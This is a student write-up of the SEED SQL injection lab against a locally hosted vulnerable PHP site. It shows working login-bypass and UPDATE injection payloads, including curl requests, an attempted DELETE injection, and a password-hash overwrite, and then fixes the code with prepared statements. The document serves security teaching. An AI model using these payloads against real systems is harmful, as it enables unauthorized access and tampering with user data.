---
title: Laboration 3 - SQL Injection
---

[Lab description](https://seedsecuritylabs.org/Labs_16.04/PDF/Web_SQL_Injection.pdf)

## Environment & tools
The provided SEED lab environment was used, which is a preconfigured virtual machine image running a 32-bit version of Ubuntu 16.04. It is being run in VirtualBox on a 64-bit Linux host.

The vulnerable web application that will be used to demonstrate SQL injection attacks is a locally hosted website that exists within the SEED lab environment, which does not follow good security practice regarding arbitrary input in SQL queries.

## Task 1: Get Familiar with SQL Statements
First task is just about getting familiar with SQL - going into the users database and selecting a row from the credentials table. We launch the MySQL console for the server that's running in the VM from the terminal:

```bash
$ mysql -u root -pseedubuntu
```

Selecting the `Users` database:

```bash
mysql> USE Users;
[...]

Database changed
```

And listing the tables in the database:

```bash
mysql> SHOW TABLES;
+-----------------+
| Tables_in_Users |
+-----------------+
| credential      |
+-----------------+
1 row in set (0.00 sec)
```

To retrieve the data in the row for Alice's profile information, we use the following query:

```bash
mysql> SELECT * FROM credential where Name = "Alice";
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
```

The resulting output is the data in the given row.

## Task 2: SQL Injection Attack on SELECT Statement
Taking a look at the login form that is provided on the locally hosted `seedlabsqlinjection.com`, whether the form is vulnerable can be tested by simply inputting a single quote into the username field. Doing that gives the following error message:

> There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '69287669f6f50391b837e131cd84d643b6d47a70'' at line 3]

This is a clear sign that user input is not properly handled in the code, and the login form is vulnerable to SQL injection. As a bonus, dumping the SQL error like this also leaks the hashed representation of the password inputted into the query, which could be used to determine that passwords are hashed with unsalted SHA1:

```
$ echo -n "cuddles" | sha1sum
69287669f6f50391b837e131cd84d643b6d47a70  -
```

Anyways. As the password field gets hashed into the query, it's not possible to be used for SQL injection and the value that we put in that field won't really matter. The username input is the useful attack vector, and the goal is to be able to log into the account named "admin" without knowing its password.

The final line of the query where the selection happens is as such, and we control the variables (denoted by dollar signs in PHP):

```sql
WHERE name= '$input_uname' and Password='$hashed_pwd'
```

If we input the username `admin';-- ` (trailing space is important) into the form then we can cut off the query early, commenting out the rest and removing the password check.

```sql
WHERE name= 'admin';--  and password='<hash>'
             ^^^^^^^^^^
```

If the backend code were to trim trailing whitespace in form input, then the `#` comment mark could be used as well to comment out the rest of the query code, as it does not require a space right after it.

Constructing a cURL command to attack this from the command-line, the login form uses GET so the arguments just get appended as query parameters to the URL, encoding things such as spaces to prevent it from being mangled:

```bash
$ curl "http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin';--%20&Password=notimportant" > page.html
```

The resulting output from the command is the HTML document which is saved to `page.html`. Opening it in a web browser shows a table of all user details. Sensitive stuff.

Just like how we can cut off the query early with a semicolon and then a comment mark, we can inject a second command that runs after the first one. Or can we?

Say we want to try to delete a row from the table, like Ted's user row:

```sql
DELETE FROM `credential` WHERE name = 'Ted';
```

This would be the request to try to inject the query:

```bash
$ curl "http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin';DELETE%20FROM%20%60credential%60%20WHERE%20name%20%3D%20'Ted';--%20&Password=cuddles"
```

However, it does not work and throws a MySQL error:

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DELETE FROM `credential` WHERE name = 'Ted';-- ' and Password='69287669f6f50391b' at line 3

I suspect this is due to the backend code using the regular PHP mysqli `query` function. The `multi_query` function would allow for inserting more queries into the vulnerable area, while the `query` function appears to only allow for one query to be executed. So in this case, we cannot do any edits to the database using this vulnerability, only read and exflitrate data (or in our case, bypass authentication).

## Task 3: SQL Injection Attack on UPDATE Statement
For this attack, the profile edit page (at `unsafe_edit_frontend.php`) will be used to perform an injection attack on an UPDATE statement.

Looking at the query in the code, all of the fields are vulnerable to SQL injection as they get directly concatenated into the string. So using the nickname field which is at the top of the query sounds like the best idea.

Task 3.1: Putting in `', salary=999999 WHERE name = "Alice";-- ` into the nickname field will cut off everything else in the query and set the salary field of Alice to 999999, even though the page is not supposed to allow for the salary to be edited. After submitting the form, the resulting page shows the table of database values and the salary of Alice has indeed changed.

Task 3.2: To set Boby's salary to 1, we can use a similar query: `', salary=1 WHERE name = "Boby";-- `

Task 3.3: To change Boby's password, we'll first have to calculate the SHA1 sum of a password we know. We'll generate one from the command-line, putting a string into `sha1sum` to generate the hash (`-n` is used to remove the newline from echo, which would mess up the hash):

```bash
$ echo -n 'password' | sha1sum
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  -
```

Now we can put it into the injected query, in the nickname field of the form: `',password="5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" WHERE name = "Boby";-- `.

The password hash does not show up in the resulting page, but going back to the login page and trying to log in with username "Boby" and password "password" shows we can successfully log into Boby's account now, showing Boby's profile and the salary field we manipulated earlier, which is 1.

## Task 4: Countermeasure - Prepared Statement
In this task we'll be fixing the SQL injection vulnerabilities that we previously exploited. We'll be making use of prepared statements to separate the SQL code from the inputted data, which will make the resulting code immune to SQL injection attacks.

In `unsafe_home.php`, the authentication mechanism consists of trying to select a row where the name and hashed password matches. Rather than concatenating the name and hashed password variables right into the query string, they are put as placeholders in the query and later provided in `bind_param`, before the query is actually executed. The rewritten code ends up as following:

```php
$stmt = $conn->prepare("SELECT
		id,name,eid,salary,birth,ssn,phoneNumber,address,email,nickname,Password
    FROM credential
    WHERE name = ? and Password = ?");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
$stmt->execute();
$result = $stmt->get_result();
```

The task description shows using `bind_result` to put values directly into variables, but in this case the result of the statement is simply retrieved into the `$result` variable, which the code below this portion will turn into an associative array that the rest of the code works on:

```php
$return_arr = array();
while ($row = $result->fetch_assoc()) {
    array_push($return_arr,$row);
}
```

Either way would work, but isn't particularly relevant to securing the code from vulnerabilities, so the least disruptive option to the surrounding code was chosen.

In `unsafe_edit_backend.php`, the `UPDATE` statement that updates the code also directly concatenates user input into the query, which led to another vulnerability which was exploited. This is likewise rewritten to make use of placeholders and then providing the data to `bind_param` as a second step before executing the query.

```php
if ($input_pwd != '') {
	// In case password field is not empty.
	$hashed_pwd = sha1($input_pwd);
	//Update the password stored in the session.
	$_SESSION['pwd']=$hashed_pwd;

	$stmt = $conn->prepare("UPDATE credential
		SET nickname=?,email=?,address=?,Password=?,PhoneNumber=? where ID=?");

	$stmt->bind_param("ssssii",
		$input_nickname, $input_email, $input_address, $hashed_pwd, $input_phonenumber, $id);
} else {
	// if password field is empty.

	$stmt = $conn->prepare("UPDATE credential
		SET nickname=?,email=?,address=?,PhoneNumber=? where ID=?");

	$stmt->bind_param("sssii",
		$input_nickname, $input_email, $input_address, $input_phonenumber, $id);
}
$stmt->execute();
```

After these code changes are made to the website, testing the forms again shows that they are no longer vulnerable to SQL injection attacks. Just inputting a single quote `'` into the username gives an error that the credentials are incorrect (which is how it should be, rather than throwing a full SQL error), and putting a single quote into the fields of the edit form works without any SQL errors.
